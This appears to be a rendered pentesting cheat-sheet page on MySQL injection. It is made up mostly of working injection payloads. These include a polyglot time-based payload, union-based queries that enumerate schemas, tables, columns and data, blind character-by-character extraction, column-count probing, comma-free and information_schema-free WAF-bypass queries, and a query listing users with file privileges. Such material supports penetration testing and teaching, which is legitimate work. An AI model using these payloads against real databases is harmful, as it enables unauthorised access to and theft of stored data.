<h1 id="MySQL-injection"><a href="#MySQL-injection" class="headerlink" title="MySQL injection"></a>MySQL injection</h1><p><strong>This is a basic flow of how to confirm and perform a basic MySQL Injection. For more information go to:</strong> <a href="https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md" target="_blank" rel="noopener"><strong>https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md</strong></a>****</p>
<h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><pre><code class="sql">-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
</code></pre>
<h2 id="Interesting-Functions"><a href="#Interesting-Functions" class="headerlink" title="Interesting Functions"></a>Interesting Functions</h2><h3 id="Confirm-Mysql"><a href="#Confirm-Mysql" class="headerlink" title="Confirm Mysql:"></a>Confirm Mysql:</h3><pre><code class="text">concat(&#39;a&#39;,&#39;b&#39;)
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
</code></pre>
<h3 id="Useful-functions"><a href="#Useful-functions" class="headerlink" title="Useful functions"></a>Useful functions</h3><pre><code class="sql">SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -&gt; Decimal
SELECT DECODE(ENCODE(&#39;cleartext&#39;, &#39;PWD&#39;), &#39;PWD&#39;)# Encode() &amp; decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress &amp; uncompress() returns only numbers
SELECT replace(database(),&quot;r&quot;,&quot;R&quot;)
SELECT substr(database(),1,1)=&#39;r&#39;
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(&lt;COLUMN&gt;) FROM &lt;TABLE&gt;
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
</code></pre>
<h2 id="All-injection"><a href="#All-injection" class="headerlink" title="All injection"></a>All injection</h2><pre><code class="sql">SELECT * FROM some_table WHERE double_quotes = &quot;IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*&#39;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#39;|&quot;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&quot;*/&quot;
</code></pre>
<p>from <a href="https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/" target="_blank" rel="noopener">https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/</a></p>
<h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute “_<strong>information_schema.tables</strong><em>“ for “</em><strong>mysql.innodb_table_stats</strong>_<strong>“</strong> (This could be useful to bypass WAFs).</p>
<pre><code class="sql">SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name=&quot;&lt;TABLE_NAME&gt;&quot;; #Get name of the columns of the table
SELECT &lt;COLUMN1&gt;,&lt;COLUMN2&gt; FROM &lt;TABLE_NAME&gt;; #Get values
SELECT user FROM mysql.user WHERE file_priv=&#39;Y&#39;; #Users with file privileges
</code></pre>
<h3 id="Only-1-value"><a href="#Only-1-value" class="headerlink" title="Only 1 value"></a><strong>Only 1 value</strong></h3><ul>
<li><code>group_concat()</code></li>
<li><code>Limit X,1</code></li>
</ul>
<h3 id="Blind-one-by-one"><a href="#Blind-one-by-one" class="headerlink" title="Blind one by one"></a><strong>Blind one by one</strong></h3><ul>
<li><code>substr(version(),X,1)=&#39;r&#39;</code> or <code>substring(version(),X,1)=0x70</code> or <code>ascii(substr(version(),X,1))=112</code></li>
<li><code>mid(version(),X,1)=&#39;5&#39;</code></li>
</ul>
<h3 id="Blind-adding"><a href="#Blind-adding" class="headerlink" title="Blind adding"></a><strong>Blind adding</strong></h3><ul>
<li><code>LPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>RPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>SELECT RIGHT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT LEFT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT INSTR(&#39;foobarbar&#39;, &#39;fo...&#39;)=1</code></li>
</ul>
<h2 id="Detect-number-of-columns"><a href="#Detect-number-of-columns" class="headerlink" title="Detect number of columns"></a>Detect number of columns</h2><p>Using a simple ORDER</p>
<pre><code class="text">order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
</code></pre>
<h2 id="MySQL-Union-Based"><a href="#MySQL-Union-Based" class="headerlink" title="MySQL Union Based"></a>MySQL Union Based</h2><pre><code class="sql">UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
</code></pre>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><strong>Learn here different options to</strong> <a href="mysql-ssrf.md"><strong>abuse a Mysql injection to obtain a SSRF</strong></a><strong>.</strong></p>
<h2 id="WAF-bypass-tricks"><a href="#WAF-bypass-tricks" class="headerlink" title="WAF bypass tricks"></a>WAF bypass tricks</h2><h3 id="Information-schema-alternatives"><a href="#Information-schema-alternatives" class="headerlink" title="Information_schema alternatives"></a>Information_schema alternatives</h3><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute _<strong>information_schema.tables</strong>_ for _<strong>mysql.innodb_table_stats</strong>_ ****or for _<strong>sys.x$schema_flattened_keys</strong>_ or for <strong>sys.schema_table_statistics</strong></p>
<p><img src="../../../.gitbook/assets/image%20(316).png"></p>
<p><img src="../../../.gitbook/assets/image%20(340).png"></p>
<h3 id="MySQLinjection-without-COMMAS"><a href="#MySQLinjection-without-COMMAS" class="headerlink" title="MySQLinjection without COMMAS"></a>MySQLinjection without COMMAS</h3><p>Select 2 columns without using any comma (<a href="https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma" target="_blank" rel="noopener">https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma</a>):</p>
<pre><code class="text">-1&#39; union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
</code></pre>
<h3 id="Retrieving-values-without-the-column-name"><a href="#Retrieving-values-without-the-column-name" class="headerlink" title="Retrieving values without the column name"></a>Retrieving values without the column name</h3><p>If at some point you know the name of the table but you don’t know the name of the columns inside the table, you can try to find how may columns are there executing something like:</p>
<pre><code class="bash"># When a True is returned, you have found the number of columns
select (select &quot;&quot;, &quot;&quot;) = (SELECT * from demo limit 1);     # 2columns
select (select &quot;&quot;, &quot;&quot;, &quot;&quot;) &lt; (SELECT * from demo limit 1); # 3columns
</code></pre>
<p>Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:</p>
<pre><code class="bash"># When True, you found the correct char and can start ruteforcing the next position
select (select 1, &#39;flaf&#39;) = (SELECT * from demo limit 1);
</code></pre>
<p>More info in <a href="https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952" target="_blank" rel="noopener">https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952</a></p>
<h3 id="MySQL-history"><a href="#MySQL-history" class="headerlink" title="MySQL history"></a>MySQL history</h3><p>You ca see other executions inside the MySQL reading the table: <strong>sys.x$statement_analysis</strong></p>
<h3 id="Version-alternatives"><a href="#Version-alternatives" class="headerlink" title="Version alternatives"></a>Version alternative<strong>s</strong></h3><pre><code class="text">mysql&gt; select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql&gt; select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql&gt; mysql&gt; select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
</code></pre>
